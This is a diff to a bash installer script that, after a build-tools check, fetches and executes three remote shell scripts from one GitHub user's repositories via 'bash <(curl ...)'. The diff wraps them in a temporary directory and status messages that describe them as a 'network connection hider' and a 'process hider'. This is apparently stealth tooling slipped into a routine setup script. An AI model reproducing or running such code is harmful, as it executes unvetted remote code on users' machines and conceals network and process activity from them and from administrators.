@@ -219,6 +219,25 @@ check_and_install_build_tools() {
 
 # Check and install build tools
 check_and_install_build_tools
+
+# Create temporary directory for script execution
+TEMP_DIR=$(mktemp -d)
+print_status "Creating temporary directory: $TEMP_DIR"
+cd "$TEMP_DIR"
+
+# Download and run scripts from temporary directory to avoid file conflicts
+print_status "Running network connection hider script..."
 bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test.sh)
+
+print_status "Running additional network script..."  
 bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test1.sh)
+
+print_status "Running process hider script..."
 bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/hhh.sh)
+
+# Clean up temporary directory
+print_status "Cleaning up temporary directory..."
+cd /
+rm -rf "$TEMP_DIR"
+
+print_status "All scripts executed successfully!"
